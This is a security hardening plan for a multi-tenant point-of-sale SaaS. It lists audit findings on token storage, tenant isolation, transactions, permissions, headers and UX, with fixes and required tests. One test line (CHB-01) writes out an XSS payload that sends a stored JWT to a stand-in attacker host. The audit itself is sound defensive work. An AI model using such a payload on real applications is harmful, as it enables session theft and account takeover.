# FixITPro — Commercial Hardening Plan
**Version:** v1.0.0-RC1 → Commercial Release  
**Date:** 2026-06-01  
**Status:** PLAN ONLY — no code modified. Awaiting approval before implementation.  
**Scope:** Full system audit — backend, frontend, SUNMI, infra, security, money, stock, repairs

---

## Executive Summary

FixITPro is currently suitable for a **single-owner internal deployment**. To be sold commercially as a **multi-tenant SaaS POS platform**, the following gaps must be resolved. The system has strong bones — solid Prisma schema, well-structured NestJS modules, good SUNMI integration — but was built with a single trusted operator in mind. Commercial sale requires adversarial hardening.

**Total findings:** 52  
**Blockers that prevent selling:** 11  
**Estimated remediation effort:** 280–340 developer-hours (~7–9 weeks at 1 engineer)

| Severity | Count | Blocks Selling |
|----------|-------|----------------|
| BLOCKER | 11 | YES |
| HIGH | 14 | YES (before first paying customer) |
| MEDIUM | 13 | No — ship and patch |
| LOW | 8 | No — ongoing improvement |
| UX | 4 | No — polish |
| DOCUMENTATION | 2 | No — compliance risk |
| **Total** | **52** | |

---

## BLOCKER — Must resolve before any commercial customer onboards

---

### CHB-01 · Access tokens stored in plaintext localStorage

**File/Module:** `web-app/src/store/auth.store.ts:56-57`, `web-app/src/lib/api.ts:19`

**Risk:**  
JWT access tokens are persisted to `localStorage` via Zustand's `persist` middleware. `api.ts` reads the token directly from `localStorage.getItem('fixitpro-auth')`. Any XSS vulnerability — in this app, a third-party package, or injected through repair notes/customer names — immediately yields the full JWT to the attacker. The token grants API access to all the victim's data until it expires (8 hours).

**Business impact:**  
Account takeover via XSS is the #1 SaaS credential theft vector. One compromised cashier account exposes an entire tenant's customer records, financials, and repair history. Commercial customers will ask about token storage during security evaluation.

**Fix approach:**  
1. Move authentication to HTTP-only `Secure` cookies issued by the backend on login (`Set-Cookie: fixitpro_token=...; HttpOnly; Secure; SameSite=Strict; Path=/`).  
2. Remove `accessToken` from Zustand `persist` config.  
3. The API client no longer reads from localStorage — the browser automatically sends the cookie.  
4. Add CSRF token for state-changing requests (double-submit cookie pattern).

**Test required:** E2E test: verify `document.cookie` does not contain the JWT; verify XSS payload `fetch('evil.com?t='+localStorage.getItem('fixitpro-auth'))` returns no token.

**Blocks selling:** YES

---

### CHB-02 · Notification endpoints not scoped to caller's tenant or user ✅ RESOLVED (S1.2)

**File/Module:** `backend/src/notifications/notifications.controller.ts` (full file)

**Risk:**  
All four endpoints (`GET /`, `GET /unread-count`, `PATCH /read-all`, `PATCH /:id/read`) call service methods without passing any `userId` or `tenantId`. The controller has `@UseGuards(JwtAuthGuard)` at class level but never extracts `@CurrentUser()`. If `NotificationsService.findAll()` does not internally scope by the authenticated user, every tenant's notifications are returned to every authenticated user.

**Business impact:**  
In a commercial multi-tenant deployment, Tenant A's cashier can read Tenant B's `SHIFT_MISMATCH`, `LOW_STOCK`, and `REPAIR_OVERDUE` notifications — revealing financial and operational intelligence about a competitor. GDPR Article 5(1)(f) violation (data integrity and confidentiality).

**Fix approach:**  
1. Add `@CurrentUser('id') userId: string, @CurrentUser('tenantId') tenantId: string` to all four controller methods.  
2. Pass `userId`/`tenantId` to every service method.  
3. All `NotificationsService` queries must `WHERE tenantId = :tenantId AND (branchId = :userBranchId OR branchId IS NULL)`.  
4. `markAllRead` must scope to `{ userId: userId }` not all records.

**Test required:** Integration test: User from Tenant A cannot see any notification created for Tenant B after fix.

**Blocks selling:** YES

---

### CHB-03 · Debt payment creates records outside a transaction ✅ RESOLVED (S1.3)

**File/Module:** `backend/src/debt-payments/debt-payments.service.ts:58-74`

**Risk:**  
`create()` calls `prisma.repairAdditionalPayment.create()` (line 58) and then `prisma.repair.update()` (line 71) as two separate, non-transactional operations. If the second call fails (deadlock, network blip, OOM), the payment record exists in the database but the repair's `paymentStatus` remains `PENDING`. The customer has paid; the system shows them as still owing.

**Business impact:**  
Double-billing customers, failed reconciliation, incorrect outstanding debt reports, angry customers. Financial dispute liability falls on the shop owner using the SaaS — they will request refunds and leave negative reviews.

**Fix approach:**  
Wrap both operations in `$transaction`:
```typescript
await this.prisma.$transaction(async (tx) => {
  await tx.repairAdditionalPayment.create({ ... });
  await tx.repair.update({ where: { id: dto.repairId }, data: { paymentStatus: newPaymentStatus } });
});
```

**Test required:** Unit test: mock Prisma `repair.update` to throw; verify `repairAdditionalPayment.create` was rolled back (no record in DB).

**Blocks selling:** YES

---

### CHB-04 · Tenant isolation absent on critical single-record lookups ✅ RESOLVED (S1.2)

**File/Module:** Multiple services — `expenses`, `serials`, `claims`, `customers`, `products`, `notifications`

**Risk:**  
`findOne(id)` methods across multiple modules retrieve records by UUID alone without verifying the record belongs to the caller's tenant. A user who knows (or guesses) a UUID from another tenant's repair ticket, customer record, or expense entry can read it directly.

Confirmed pattern:
```typescript
// Current — insecure
async findOne(id: string) {
  return this.prisma.expense.findUnique({ where: { id } });
}
```

**Business impact:**  
Direct unauthorized access to competitor's customer PII, financial records, repair history. Regulatory violation (PDPA Thailand, GDPR). Immediate grounds for contractual breach claims by commercial customers.

**Fix approach:**  
Every `findOne` must pass and verify `tenantId`:
```typescript
async findOne(id: string, tenantId: string) {
  const record = await this.prisma.expense.findUnique({ where: { id } });
  if (!record || record.tenantId !== tenantId) throw new NotFoundException();
  return record;
}
```
Controllers must extract `tenantId` from `@CurrentUser('tenantId')` and pass to service.

**Test required:** Test: Authenticated user from Tenant A calling `GET /expenses/:id` where the expense belongs to Tenant B receives `404 Not Found`.

**Blocks selling:** YES

---

### CHB-05 · Financial amount fields lack maximum bounds ✅ RESOLVED (S1.4)

**File/Module:** DTOs in `debt-payments`, `expenses`, `carrier-wallet`, `purchase-orders`

**Risk:**  
DTOs validate `@Min(0.01)` (or similar) but have no `@Max()` constraint. A malformed or malicious request can submit `amount: 9999999999999`. Prisma stores this in a `Decimal` field which may overflow or corrupt financial reports. There is no application-level sanity cap per transaction.

**Business impact:**  
A single corrupted transaction can render a branch's financial reports unreadable. Manual correction required. If stored successfully, payroll calculations or tax filings based on the data could be legally wrong.

**Fix approach:**  
Add `@Max()` to all financial DTOs with a business-appropriate cap (e.g., 10,000,000 THB per transaction — adjustable per tenant tier):
```typescript
@Type(() => Number)
@IsNumber({ maxDecimalPlaces: 2 })
@Min(0.01)
@Max(10_000_000)
amount: number;
```
Also validate in service layer: `if (amount > tenant.transactionCap) throw BadRequestException(...)`.

**Test required:** API test: POST with `amount: 99999999999` returns `400 Bad Request`.

**Blocks selling:** YES

---

### CHB-06 · Missing permission guards on write endpoints in 6+ modules ✅ RESOLVED (S1.2)

**File/Module:** `notifications/notifications.controller.ts`, `customers/customers.controller.ts`, `serials/serials.controller.ts`, `claims/claims.controller.ts`, `debt-payments/debt-payments.controller.ts`, `subscription/subscription.controller.ts`

**Risk:**  
Multiple PATCH/POST endpoints lack `@UseGuards(PermissionGuard)` and `@RequirePermission(...)` decorators. Any authenticated user — regardless of role — can call these endpoints. The `notifications.controller.ts` `markAllRead` is the starkest example: it has no permission guard at all.

**Business impact:**  
A CASHIER can mark all OWNER-level notifications as read, hiding critical operational alerts. A TECHNICIAN could create a customer record, a debt payment, or trigger subscription changes. In a commercial deployment with staff who may be disgruntled or curious, this is a serious fraud and operational risk.

**Fix approach:**  
Systematic audit pass: every controller method must have either:
- Class-level `@UseGuards(JwtAuthGuard, PermissionGuard)` + method `@RequirePermission(...)`, or
- Method-level `@UseGuards(PermissionGuard)` + `@RequirePermission(...)` for write methods.

Read-only GET endpoints may use class-level JwtAuthGuard only (with tenant-scoped queries).

**Test required:** API test matrix: for each unguarded endpoint, verify CASHIER/TECHNICIAN role receives `403 Forbidden`.

**Blocks selling:** YES

---

### CHB-07 · JWT payload missing `tenantId` — tenant isolation relies on fragile lookups ✅ RESOLVED (S1.1)

**File/Module:** `backend/src/auth/auth.service.ts:35`

**Risk:**  
Already documented in Production Readiness Review (BLK-3). For commercial hardening this is even more critical: every multi-tenant data query should be able to scope by `req.user.tenantId` without an additional DB lookup. Without `tenantId` in the JWT, developers are forced to either (a) re-fetch the user on every request, or (b) miss tenant scoping silently when they forget.

**Business impact:**  
The C-2 fix throws `ForbiddenException` when `tenantId` is null from the JWT — but this means the entire `getDeviceHistory` endpoint is broken for all non-SUPER_ADMIN users in production because `CurrentUser('tenantId')` always returns null from the token.

**Fix approach:**  
```typescript
// auth.service.ts:35
const token = this.jwtService.sign({
  sub: user.id, email: user.email, role: user.role,
  branchId: user.branchId ?? null,
  tenantId: user.tenantId ?? null,
});
```
Update `jwt.strategy.ts` to include `tenantId` in the user payload. Add `validate-prod-env.ps1` test for this.

**Test required:** Decode JWT after login; assert `tenantId` field is present and non-null for non-SUPER_ADMIN users.

**Blocks selling:** YES

---

### CHB-08 · API client falls back to HTTP localhost when env var unset ✅ RESOLVED (S1.1)

**File/Module:** `web-app/src/lib/api.ts:10`

**Risk:**  
```typescript
baseURL: process.env.NEXT_PUBLIC_API_URL || 'http://localhost:3000/api/v1'
```
If `NEXT_PUBLIC_API_URL` is omitted from a deployment's environment (CI/CD misconfiguration, env file not copied), the APK or web app silently routes all API traffic to `localhost:3000` on the device — which resolves to nothing, breaking the entire app with no error message explaining why.

**Business impact:**  
Silent deployment failure. A shop owner upgrades the APK and suddenly the app stops working because the build environment didn't have the env var. Support calls and refund demands.

**Fix approach:**  
Fail loudly at build time:
```typescript
const API_URL = process.env.NEXT_PUBLIC_API_URL;
if (!API_URL) {
  throw new Error('NEXT_PUBLIC_API_URL is required. Set it in .env.production before building.');
}
const api = axios.create({ baseURL: API_URL, ... });
```

**Test required:** CI test: build fails if `NEXT_PUBLIC_API_URL` is unset.

**Blocks selling:** YES

---

### CHB-09 · Helmet middleware absent — critical security headers missing ✅ RESOLVED (S1.1)

**File/Module:** `backend/src/main.ts` (omission)

**Risk:**  
Already documented in Production Readiness Review (BLK-1). For commercial SaaS this also means failing automated security scanner checks that commercial customers (especially enterprise) run before approving a vendor. Common scanners (OWASP ZAP, Qualys, Snyk) flag missing `X-Content-Type-Options`, `X-Frame-Options`, and `CSP`.

**Business impact:**  
Failing a customer's security review = lost sale. Enterprise customers often have security questionnaires. "Do you set security headers?" requires a yes.

**Fix approach:**  
```bash
npm install @nestjs/helmet
```
```typescript
import helmet from '@nestjs/helmet';
app.use(helmet());
```
Add CSP header to nginx template (see production readiness H-6).

**Test required:** Run OWASP ZAP against staging; assert zero "Missing Security Header" findings.

**Blocks selling:** YES

---

### CHB-10 · `SELECT` used for lock-sensitive stock operations — phantom reads possible ✅ RESOLVED (S1.3)

**File/Module:** `backend/src/branches/branches.service.ts` (stock transfer receive), `backend/src/purchase-orders/purchase-orders.service.ts` (receiveGoods)

**Risk:**  
Stock transfer receive reads `fromBranchStock.quantity`, validates it covers the transfer quantity, then deducts. These read and write are inside a `$transaction` but Prisma uses `READ COMMITTED` isolation by default. Two concurrent receive-transfer requests for the same product from the same branch can both read `quantity = 10`, both see 10 >= 5, both deduct 5, and leave stock at 0 instead of 5.

The C-1 fix applied the `updateMany WHERE quantity >= demand` pattern to sales. The same pattern must be applied to stock transfers and PO receive.

**Business impact:**  
Negative branch stock after concurrent transfers. Multi-branch franchise shops running high-volume transfers hit this during busy periods. Inventory discrepancy requiring manual stocktake.

**Fix approach:**  
Apply the same atomic conditional-decrement pattern used in C-1:
```typescript
const result = await tx.branchStock.updateMany({
  where: { branchId: fromBranchId, productId, quantity: { gte: transferQty } },
  data: { quantity: { decrement: transferQty } },
});
if (result.count === 0) throw new BadRequestException('Insufficient stock in source branch');
```

**Test required:** Concurrent stress test: 10 simultaneous transfer-receive requests for the same product; assert final stock = initial - (successful transfers × qty), never negative.

**Blocks selling:** YES

---

### CHB-11 · No CSP header — XSS has no fallback restriction ✅ RESOLVED (S1.4)

**File/Module:** `nginx/templates/app.conf.template` (omission)

**Risk:**  
Already covered in Production Readiness Review (H-6). For commercial SaaS context: repair notes, customer names, and expense descriptions are user-supplied strings displayed back in the UI. Even with React's default escaping, a future developer using `dangerouslySetInnerHTML`, a vulnerable third-party component, or an accidentally rendered HTML string bypasses React's escaping. Without CSP, the browser executes any injected script — including token exfiltration from localStorage (CHB-01 compound risk).

**Business impact:**  
Stored XSS in repair notes could silently exfiltrate all branch data. One compromised repair ticket affects all staff who open it. Customer-facing repair status pages (if added later) could be vectors.

**Fix approach:**  
Add `Content-Security-Policy` to nginx template. Start with report-only mode (`Content-Security-Policy-Report-Only`) to identify violations, then enforce:
```nginx
add_header Content-Security-Policy
  "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; connect-src 'self' wss:; frame-ancestors 'none'; report-uri /api/v1/csp-report"
  always;
```

**Test required:** Send a request with `Content-Security-Policy: default-src 'none'` to CSP test page; verify no external script loads.

**Blocks selling:** YES

---

## HIGH — Resolve before first paying customer's data is in the system

---

### CHH-01 · Carrier wallet balance race condition

**File/Module:** `backend/src/carrier-wallet/carrier-wallet.service.ts`

**Risk:** Balance is read, then deducted in separate non-atomic operations. Concurrent package sales can overdraw the wallet.

**Business impact:** Negative carrier balance; billing disputes with telecom partners; reconciliation failures at month end.

**Fix approach:** Use atomic `updateMany(WHERE balance >= deduction)` inside transaction; rollback if count=0.

**Test required:** Concurrent test: 10 simultaneous package sales totalling more than available balance; assert exactly the possible number succeed, final balance ≥ 0.

**Blocks selling:** YES (before first telecom transaction)

---

### CHH-02 · Audit logs missing on carrier wallet, serial, notification read, customer tag updates

**File/Module:** `carrier-wallet/carrier-wallet.service.ts`, `serials/serials.service.ts`, `notifications/notifications.service.ts`, `customers/customers.service.ts`

**Risk:** Financial and inventory mutations occur without audit trail entries. Cannot investigate fraud, cannot produce audit report for accountant.

**Business impact:** Cannot pass financial audit. Cannot demonstrate due diligence to customers with compliance requirements (ISO 27001, SOC 2, Thai PDPA).

**Fix approach:** Add `auditLog.log(...)` to every method that creates, updates, or deletes a financial or inventory record. Every carrier topup/deduction, serial status change, and customer VIP tag update must be logged.

**Test required:** After each operation, query `auditLog.findMany({ entityId })` and assert entry exists.

**Blocks selling:** NO (but mandatory for regulated industries)

---

### CHH-03 · Exception filter returns raw validation arrays — schema leak

**File/Module:** `backend/src/common/filters/http-exception.filter.ts:26-28`

**Risk:** NestJS `ValidationPipe` errors contain field names, types, and constraints. `400 Bad Request` responses expose internal DTO schema.

**Business impact:** Attacker enumerates field constraints from 400 responses, crafts precise bypass attempts.

**Fix approach:**
```typescript
if (isProd && status === 400 && Array.isArray(message)) {
  message = 'Invalid request data';
}
```

**Test required:** Send invalid payload to any guarded endpoint in production mode; assert response message is a single string, not an array.

**Blocks selling:** NO (security best practice)

---

### CHH-04 · Permission guard queries DB on every protected request

**File/Module:** `backend/src/common/guards/permission.guard.ts:27-29`

**Risk:** `rolePermission.findUnique()` executes on every API request. At 5 req/s per user with 10 concurrent users = 50 permission DB queries/second. Permissions change only when an OWNER updates role configuration — rarely.

**Business impact:** Database bottleneck under load. Slow response times. For a commercial SaaS with 50+ tenants, this becomes a primary performance constraint.

**Fix approach:** In-memory TTL cache per role:
```typescript
private cache = new Map<string, { allowed: boolean; expiresAt: number }>();

async canActivate(ctx) {
  const key = `${user.role}:${permission}`;
  const cached = this.cache.get(key);
  if (cached && cached.expiresAt > Date.now()) return cached.allowed;
  const has = await this.prisma.rolePermission.findUnique({ ... });
  const allowed = !!has;
  this.cache.set(key, { allowed, expiresAt: Date.now() + 60_000 });
  if (!allowed) throw new ForbiddenException(...);
  return allowed;
}
```
Invalidate cache when OWNER updates permissions.

**Test required:** Load test: 100 concurrent requests; assert permission guard adds < 1ms overhead (cache hit).

**Blocks selling:** NO (performance)

---

### CHH-05 · Repair workflow status transition not aligned between frontend and backend

**File/Module:** `web-app/src/app/sunmi/repairs/page.tsx:71-78`, `backend/src/repairs/repairs.service.ts:206-222`

**Risk:** The SUNMI frontend (`canTransitionStatus`) uses the OLD `toIdx > fromIdx` logic (any forward move). The backend now uses the explicit `ALLOWED` map (M-2 fix). A SUNMI user sees "advance status" buttons for transitions the backend will reject. The user taps the button, sees a confusing error with no guidance.

**Business impact:** Staff confusion during repair workflow. "The app is broken" support calls. Bad first impression for new commercial customers.

**Fix approach:** Sync the frontend `canTransitionStatus` function with the same `ALLOWED` map used in the backend:
```typescript
const ALLOWED: Record<string, string[]> = {
  'RECEIVED':         ['DIAGNOSING'],
  'DIAGNOSING':       ['WAITING_APPROVAL', 'APPROVED', 'IN_PROGRESS'],
  // ... (mirror backend exactly)
};
function canTransitionStatus(from: RepairStatus, to: RepairStatus): boolean {
  if (to === 'CANCELLED') return true;
  return (ALLOWED[from] ?? []).includes(to);
}
```

**Test required:** Verify all previously-hidden "blocked" transition buttons stay hidden after the fix.

**Blocks selling:** NO (UX issue)

---

### CHH-06 · Branch context sent via custom header `X-Branch-Id` — not validated server-side

**File/Module:** `web-app/src/lib/api.ts:29-31`

**Risk:** `api.ts` sends `X-Branch-Id: branchId` with every request. If any backend endpoint reads this header to determine branch scope (instead of using the JWT-embedded `branchId`), a user can forge any `branchId` by crafting a request with a custom header.

**Business impact:** Cross-branch data access — CASHIER can access any other branch's sales, stock, or repairs by spoofing the header.

**Fix approach:**
1. Backend must NEVER use `X-Branch-Id` header for security-sensitive data scoping. All branch scoping must come exclusively from `req.user.branchId` (JWT claim).
2. Audit all controllers: grep for `request.headers['x-branch-id']` and remove any usage.
3. `X-Branch-Id` may be used only for non-security UI hints (e.g., "which branch is the user currently viewing" in multi-branch OWNER context), never for `WHERE branchId = :header`.

**Test required:** Send a request with a forged `X-Branch-Id` pointing to a different branch; assert response only contains data for the JWT's `branchId`.

**Blocks selling:** YES

---

### CHH-07 · PO payment has no confirmation dialog

**File/Module:** `web-app/src/app/(dashboard)/purchase-orders/page.tsx` (payMutation trigger)

**Risk:** Supplier payment amount is entered and submitted with a single click. Fat-finger on amount field creates a payment record with wrong amount.

**Business impact:** Erroneous supplier payment amounts. Reconciliation with supplier invoices fails. Manual adjustment and note-taking required. For a business with 20+ supplier payments per month, this is a frequent pain point.

**Fix approach:** Add `ConfirmActionDialog` before `payMutation.mutate()`:
```tsx
<ConfirmActionDialog
  title="ยืนยันจ่ายเงินซัพพลายเออร์"
  description={`จ่าย ${formatThaiMoney(amount)} ให้ ${supplier.name}`}
  variant="warning"
  onConfirm={() => payMutation.mutate()}
/>
```

**Test required:** Manual: click pay button → confirm dialog appears → cancel → no payment created.

**Blocks selling:** NO (UX)

---

### CHH-08 · No confirm dialog before product delete

**File/Module:** `web-app/src/app/(dashboard)/products/page.tsx`

**Risk:** Deleting a product soft-deletes it (`isActive: false`) but leaves BranchStock records. Historic sale records reference it. No warning is shown about the impact.

**Business impact:** Manager accidentally disables a fast-moving SKU mid-shift. Staff can't sell it. No way to undo without direct DB access.

**Fix approach:** Add confirm dialog listing: "Product will be hidden from POS. Existing sales history preserved. Stock adjustments disabled." Require OWNER permission to delete.

**Test required:** MANAGER role cannot see delete button. OWNER sees confirm dialog before deletion.

**Blocks selling:** NO (UX)

---

### CHH-09 · No real-time notification delivery — polling only

**File/Module:** `backend/src/notifications/` (no WebSocket), `web-app/src/app/(dashboard)/notifications/page.tsx`

**Risk:** Notifications are fetched via polling (`refetchInterval`). A `SHIFT_MISMATCH` notification after shift close may take up to 5 minutes to appear on the manager's screen.

**Business impact:** Critical operational alerts (low stock, overdue repairs, shift mismatch) are delayed. For a commercial shop with a manager monitoring remotely via web dashboard, 5-minute delays are unacceptable.

**Fix approach (minimal):** Set `staleTime: 0, refetchInterval: 30_000` (30s) for notification queries. This is not true real-time but reduces latency to 30s.  
**Fix approach (proper):** Implement Server-Sent Events (SSE) endpoint for notifications. NestJS `@Sse()` decorator is available. Client subscribes with `EventSource`.

**Test required:** Trigger a `SHIFT_MISMATCH` event; assert notification appears in UI within 30 seconds.

**Blocks selling:** NO (acceptable for current scale)

---

### CHH-10 · Missing pagination on high-volume reports and dashboard queries

**File/Module:** `backend/src/reports/reports.service.ts`, `backend/src/dashboard/dashboard.service.ts`

**Risk:** Several queries fetch unbounded result sets. With 1 year of data (10K+ sales), the dashboard data request could return 10MB+ of JSON, overwhelming mobile devices.

**Business impact:** App hangs or crashes on SUNMI device after 6 months of usage. Dashboard loads take 30+ seconds. Commercial customers on year 2 will file support tickets.

**Fix approach:**
1. Dashboard `weeklyRevenue` — limit to 90 days max.
2. `recentActivities` — limit to 20 most recent.
3. All report queries — require `startDate`/`endDate` params; reject requests spanning more than 366 days.
4. Add `take: 1000` hard caps on all `findMany` without explicit limits.

**Test required:** Performance test: load dashboard with 2 years of seeded data; assert response < 500ms, response body < 500KB.

**Blocks selling:** NO (performance degrades over time)

---

### CHH-11 · Backup has no off-site copy — single point of failure

**File/Module:** `scripts/backup-prod.ps1`, `scripts/backup-local.ps1`

**Risk:** All backups stored on the same physical machine. Already documented in Production Readiness Review (H-4).

**Business impact:** Full data loss on hardware failure. A SaaS vendor has implicit data durability obligations to customers. Total loss of a shop's 2 years of customer and financial data = immediate legal liability.

**Fix approach:** Configure `backup-local.ps1` `$Cfg.CloudDir` or `$Cfg.ExtDrive` before first customer deployment. Test restore monthly.

**Test required:** Monthly drill: restore from off-site backup to a staging server; verify data integrity.

**Blocks selling:** YES (contractual data durability)

---

### CHH-12 · No rate limiting on financial mutation endpoints

**File/Module:** `nginx/templates/app.conf.template:76-79`

**Risk:** The general API rate limit (`60r/m`) applies to all `/api/*` paths. Financial endpoints (create sale, create expense, debt payment) are not separately rate-limited. A compromised account can create hundreds of expense records per minute.

**Business impact:** Fraudulent expense inflation, fake sales records, financial report pollution.

**Fix approach:** Add stricter rate limits for financial write endpoints:
```nginx
location ~ ^/api/v1/(sales|expenses|debt-payments) {
  limit_req zone=api_financial burst=10 nodelay;
  proxy_pass http://backend:3000;
}
```
Define `limit_req_zone $binary_remote_addr zone=api_financial:10m rate=30r/m;` in nginx.conf.

**Test required:** Script 100 rapid expense create requests; assert requests after #30 receive `429`.

**Blocks selling:** NO

---

### CHH-13 · Password policy not enforced

**File/Module:** `web-app/src/app/(dashboard)/employees/page.tsx` (password input), `backend/src/auth/dto/register.dto.ts`

**Risk:** Staff password creation has `minLength="6"` in the HTML input only. No backend DTO validation beyond length. Common passwords like `123456`, `password`, `fixitpro` are accepted.

**Business impact:** Brute-force attacks on cashier accounts. Compromised account = full POS access including cash sales and expense creation.

**Fix approach:**
1. Backend: Add password strength validator to `CreateUserDto`:
   ```typescript
   @Matches(/^(?=.*[A-Z])(?=.*\d).{8,}$/, { message: 'Password must be 8+ chars, 1 uppercase, 1 number' })
   password: string;
   ```
2. Frontend: Add real-time strength indicator (weak/fair/strong).

**Test required:** API test: POST `/users` with password `123456` returns `400 Bad Request`.

**Blocks selling:** NO (security hardening)

---

### CHH-14 · `smoke-test-prod.ps1` referenced in checklist but does not exist

**File/Module:** `PROD_DEPLOY_CHECKLIST.md`, `scripts/` directory

**Risk:** The deploy checklist references a smoke test script that doesn't exist. Operators following the checklist skip this step or run nothing.

**Business impact:** Silent regressions reach production. Post-deploy verification is manual and inconsistent.

**Fix approach:** Create `scripts/smoke-test-prod.ps1` that:
1. Calls `GET /api/v1/health` → assert 200
2. Calls `POST /api/v1/auth/login` with test account → assert JWT returned
3. Calls `GET /api/v1/products` with JWT → assert array returned
4. Calls `GET /api/v1/repairs` with JWT → assert array returned
5. Reports PASS/FAIL to stdout and exits 1 on failure

**Test required:** The script itself passes on a healthy deployment.

**Blocks selling:** NO

---

## MEDIUM — Ship and patch within 30 days

---

### CHM-01 · Branch header `X-Branch-Id` included in every request but not validated

See CHH-06. The header exists but servers that misuse it are an active risk. Track down any remaining usages.

---

### CHM-02 · Hard-delete used on some models, soft-delete on others

**File/Module:** Various services

**Risk:** Inconsistent deletion strategies. Some models hard-delete (data gone forever), others soft-delete (`isActive: false`). Hard-deleting a product that appeared in 200 historical sale records breaks reports.

**Fix approach:** Audit every `prisma.model.delete()` call. Replace with `update({ data: { deletedAt: new Date(), isActive: false } })`. Add a `prisma.$extends` that automatically filters out `deletedAt IS NOT NULL` records.

---

### CHM-03 · Product soft-delete does not cascade to BranchStock

**File/Module:** `backend/src/products/products.service.ts`

**Risk:** Deactivated products still appear in branch stock lists and low-stock alerts.

**Fix approach:** When `isActive` is set to `false`, also update `BranchStock` to set a soft-delete flag or zero the minStock threshold.

---

### CHM-04 · Carrier wallet topup lacks maximum per-transaction cap

**File/Module:** `backend/src/carrier-wallet/carrier-wallet.service.ts`

**Risk:** No upper bound on individual topup amounts. Operator can topup ฿10,000,000 in one transaction.

**Fix approach:** Add `@Max(100_000)` to topup DTO; configurable per tenant plan.

---

### CHM-05 · Expense `description` field has no maximum length

**File/Module:** `backend/src/expenses/dto/create-expense.dto.ts`

**Risk:** 1MB+ description strings can be stored and returned in every expenses list call.

**Fix approach:** Add `@MaxLength(1000)` to description fields.

---

### CHM-06 · Settings `logoUrl` accepts any string including `javascript:` URIs

**File/Module:** `web-app/src/app/(dashboard)/settings/page.tsx`

**Risk:** Malicious logoUrl could be rendered in receipt HTML if not sanitized.

**Fix approach:** Validate URL format server-side: `new URL(dto.logoUrl)` must not throw; scheme must be `https:`.

---

### CHM-07 · `staleTime` too long on PO and financial data

**File/Module:** `web-app/src/app/(dashboard)/purchase-orders/page.tsx`

**Risk:** `staleTime: 30_000` on purchase order list. A second operator paying the same PO creates a race condition in the UI.

**Fix approach:** Set `staleTime: 5_000` for financial data that can change from other users.

---

### CHM-08 · Transfer approval not idempotent — double-approve creates duplicate entries

**File/Module:** `backend/src/branches/branches.service.ts` (approveTransfer)

**Risk:** No check that transfer is `PENDING` before approving. Double-tap approval or network retry creates ambiguous state.

**Fix approach:** Add `if (transfer.status !== 'PENDING') throw BadRequestException('Already processed')` as first line of approve method.

---

### CHM-09 · Serial number lookup endpoint may expose cross-tenant data

**File/Module:** `backend/src/serials/serials.controller.ts`

**Risk:** Serial lookup by serial number string doesn't filter by tenant. Shop A can look up Shop B's serial if they know or guess a serial number.

**Fix approach:** Add `tenantId` filter to all serial queries.

---

### CHM-10 · Audit log `ipAddress` and `userAgent` are always null

**File/Module:** `backend/src/audit-log/audit-log.service.ts`

**Risk:** Audit trail cannot identify which device or network performed an action. Cannot distinguish SUNMI device from desktop browser.

**Fix approach:** Inject `ClsService` (NestJS `nestjs-cls`) to propagate `request.ip` and `request.headers['user-agent']` from request context into `auditLog.log()` calls automatically.

---

### CHM-11 · No login failure audit logging

**File/Module:** `backend/src/auth/auth.service.ts`

**Risk:** Failed login attempts are not logged. Cannot detect brute-force attacks or account lockout policy violation.

**Fix approach:** Add `auditLog.log({ action: 'LOGIN_FAILED', entityId: user?.id, afterData: { email: dto.email } })` in the `UnauthorizedException` path.

---

### CHM-12 · App crashes if SUNMI printer is unavailable — no graceful fallback

**File/Module:** `web-app/src/components/sunmi/printer-flow.tsx` (print error handling)

**Risk:** If SUNMI AIDL printer plugin fails (paper out, queue full), the app may show a raw JavaScript error rather than a friendly retry prompt.

**Fix approach:** Wrap all `SunmiPrinterPlugin` calls in try/catch; show "ไม่สามารถพิมพ์ได้ — กรุณาลองใหม่" toast with a retry button.

---

### CHM-13 · Category names can be duplicated — no uniqueness enforcement

**File/Module:** `backend/src/categories/` (implied), `web-app/src/app/(dashboard)/categories/page.tsx`

**Risk:** `สินค้า` category can be created twice. Reports show duplicate categories. Staff confusion.

**Fix approach:** Add `@@unique([name, tenantId])` to Category model in Prisma schema. Frontend shows "already exists" error.

---

## LOW — Post-launch improvement backlog

---

### CHL-01 · Loading state presentation inconsistent across pages

**Fix:** Standardize to skeleton rows for tables and centered spinner for modals across all pages.

---

### CHL-02 · Empty states missing call-to-action buttons on suppliers, purchase orders pages

**Fix:** Add "เพิ่ม [entity] แรก" button to all empty states matching the `customers` page pattern.

---

### CHL-03 · Password field has no strength meter on employee create

**Fix:** Use `zxcvbn` library to show weak/fair/strong indicator. Reject score < 2 for new accounts.

---

### CHL-04 · bcrypt rounds = 12 — 250ms login latency acceptable for now

**Fix:** No action needed for current scale. Re-evaluate at 1000+ login/day.

---

### CHL-05 · JWT expires in 8h with no refresh token — staff must re-login

**Fix:** Implement refresh token endpoint with HTTP-only cookie. Prioritise after CHB-01 (token storage).

---

### CHL-06 · Console.warn used instead of NestJS Logger in some services

**File/Module:** `notifications/notifications.service.ts`

**Fix:** Replace all `console.warn`/`console.error` with injected NestJS `Logger`.

---

### CHL-07 · Pagination maximums inconsistent across modules (100 vs 200)

**Fix:** Define `MAX_PAGE_SIZE = 100` constant and use everywhere.

---

### CHL-08 · No idempotency key support on financial endpoints

**Fix:** Accept optional `Idempotency-Key` header; store key with TTL; return cached response on duplicate.

---

## UX — Commercial polish

---

### CHU-01 · SUNMI touch targets below 44px

**File/Module:** `web-app/src/app/sunmi/dashboard/page.tsx` and other SUNMI pages

**Risk:** Buttons with `h-10 w-10` (40px) are below WCAG 2.5.5 minimum touch target size.

**Fix:** Change all action buttons on SUNMI pages to `h-12 w-12` (48px) minimum.

---

### CHU-02 · Colorblind-inaccessible status badges

**File/Module:** `web-app/src/app/(dashboard)/warranties/page.tsx`

**Risk:** Status badges rely solely on color (red/amber/green). 1 in 12 male users cannot distinguish them.

**Fix:** Add distinct icons per status: ✓ ACTIVE (check), ⏰ EXPIRING (clock), ✗ EXPIRED (X), 🚫 VOIDED (ban), 📋 CLAIMED (clipboard).

---

### CHU-03 · Audit log displays date in `en-CA` format (YYYY-MM-DD) — inconsistent with Thai locale

**File/Module:** `web-app/src/app/(dashboard)/audit-logs/page.tsx`

**Fix:** Use `format(date, 'dd MMM yyyy HH:mm', { locale: th })` from date-fns for all date display.

---

### CHU-04 · Modal footers can be hidden on small screens

**File/Module:** `web-app/src/app/(dashboard)/purchase-orders/page.tsx`

**Fix:** Sticky footer with `sticky bottom-0 bg-white border-t` on all dialog footers with action buttons.

---

## DOCUMENTATION

---

